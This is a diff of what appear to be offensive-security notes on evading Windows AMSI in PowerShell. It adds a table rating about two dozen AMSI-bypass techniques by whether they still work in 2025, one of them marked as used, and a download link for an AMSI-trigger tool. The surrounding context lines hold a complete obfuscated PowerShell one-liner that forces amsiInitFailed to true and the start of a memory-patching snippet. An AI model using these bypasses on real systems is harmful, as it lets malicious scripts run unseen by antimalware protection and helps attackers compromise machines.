@@ -440,6 +440,32 @@ https://github.com/pracsec/AmsiScanner/tree/main/src
 
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patching-Clr
 
+| Technique                                                   | Patches CLR | Patches AMSI | Works in 2025? |
+| ----------------------------------------------------------- | ----------- | ------------ | -------------- |
+| Patching AmsiScanBuffer in clr.dll                          | Yes         | Yes          | Possible       |
+| ScriptBlock Smuggling                                       | No          | No           | Possible       |
+| Reflection ScanContent Change                               | Yes         | Yes          | Unlikely       |
+| Using Hardware Breakpoints                                  | No          | Yes          | Possible       |
+| Using CLR Hooking                                           | Yes         | No           | Likely         |
+| Patch the provider’s DLL of Microsoft MpOav.dll             | No          | Yes          | Unlikely       |
+| Scanning Interception and Provider Function Patching        | Yes         | Yes          | Possible       |
+| ***Patching AMSI AmsiScanBuffer by rasta-mouse *** USED!    | No          | Yes          | Unlikely       |
+| Patching AMSI AmsiOpenSession                               | No          | Yes          | Unlikely       |
+| Don’t Use Net WebClient                                     | No          | No           | Obsolete       |
+| Amsi ScanBuffer Patch from Contextis                        | No          | Yes          | Unlikely       |
+| Forcing an Error                                            | No          | Yes          | Unlikely       |
+| Disable Script Logging                                      | No          | No           | Possible       |
+| Amsi Buffer Patch - In Memory                               | No          | Yes          | Unlikely       |
+| Same as 6 but Integer Bytes Instead of Base64               | No          | Yes          | Unlikely       |
+| Using Matt Graeber’s Reflection Method                      | Yes         | Yes          | Unlikely       |
+| Using Matt Graeber’s Reflection Method with WMF5            | Yes         | Yes          | Unlikely       |
+| Using Matt Graeber’s Second Reflection Method               | Yes         | Yes          | Unlikely       |
+| Using Cornelis de Plaa’s DLL Hijack Method                  | No          | Yes          | Unlikely       |
+| Use PowerShell Version 2 - No AMSI Support                  | No          | No           | Unlikely       |
+| Nishang All in One                                          | Yes         | Yes          | Possible       |
+| Adam Chesters Patch                                         | No          | Yes          | Unlikely       |
+| Patching AmsiScanBuffer in System.Management.Automation.dll | Yes         | Yes          | Possible       |
+
 ```powershell
 $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
 
@@ -462,6 +488,8 @@ output =
 ```powershell
 [Ref].Assembly.GetType(("{6}{4}{10}{3}{5}{7}{0}{11}{2}{1}{8}{9}"-f'.Auto','U','.Amsi','g','tem.','eme','Sys','nt','ti','ls','Mana','mation')).GetField(("{0}{1}{2}" -f 'amsi','InitFa','iled'),("{1}{0}{4}{2}{3}" -f'c','NonPubli','t','ic',',Sta')).SetValue($null,$true)
 ```
+---
+<https://github.com/RythmStick/AMSITrigger/releases/download/v4/AmsiTrigger.exe>
 
 # AMSI-Trigger
 ```powershell
